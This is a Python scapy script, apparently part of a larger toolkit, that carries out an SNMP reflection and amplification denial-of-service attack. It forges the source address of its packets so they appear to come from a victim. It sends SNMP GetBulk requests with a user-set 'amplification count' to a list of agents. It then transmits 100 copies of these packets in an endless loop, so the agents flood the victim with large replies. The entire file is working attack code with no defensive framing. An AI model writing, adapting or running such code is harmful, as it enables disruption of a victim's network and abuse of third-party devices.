from scapy.all import *
import argparse
import ipaddress
import common

parser = argparse.ArgumentParser(description='',
                                 formatter_class=argparse.RawTextHelpFormatter,usage="snmp_ref")
parser.add_argument('-s', dest="source_addr", nargs='?', type=str, help='source address', required=True)
parser.add_argument('-P', dest="sport", nargs='?', type=int, help='source port')
parser.add_argument('-a', dest="agents", nargs='?', type=str, help='agent list', required=True)
parser.add_argument('-r', dest="max_repeat", nargs='?', type=int, help='snmp bulk max repeat or amplification count',
                    required=True)
parser.add_argument('-o', dest="oid", nargs='?', type=str, help='object id', required=False)


if common.print_sub_help:
    parser.print_help()
    exit(0)

snmp_args ,_= parser.parse_known_args()

p = []
def init():
    global p
    source_addr=snmp_args.source_addr
    ipaddress.IPv4Address(source_addr)
    source_port = snmp_args.sport if snmp_args.sport else 162
    agents = snmp_args.agents

    varbind = []

    if snmp_args.oid:
        for i in snmp_args.oid.split(","):
            varbind.append(SNMPvarbind(oid=i))
    else:
        varbind = [SNMPvarbind(oid="1.3.6.1.2.1.1")]

    agents=agents.split(",")

    for i in agents:
        s = i.split("@")
        if len(s) != 2:
            print("agent format illegal,format: ip[:port]@community")
            exit(-1)
        community = s[1]
        s = s[0].split(":")
        addr = s[0]
        if len(s) == 1:
            port = 161
        elif len(s) == 2:
            port = s[1]
        else:
            print("agent format illegal,format: ip[:port]@community")
            exit(-1)

        ipaddress.IPv4Address(addr)

        snmp = SNMP(community=community)
        snmp.PDU = SNMPbulk(varbindlist=varbind,max_repetitions=snmp_args.max_repeat)
        p.append(IP(src=source_addr, dst=addr) / UDP(sport=source_port, dport=port) / snmp)


def run():
    global p
    p=p*100
    while 1:
        send(p,verbose=False)
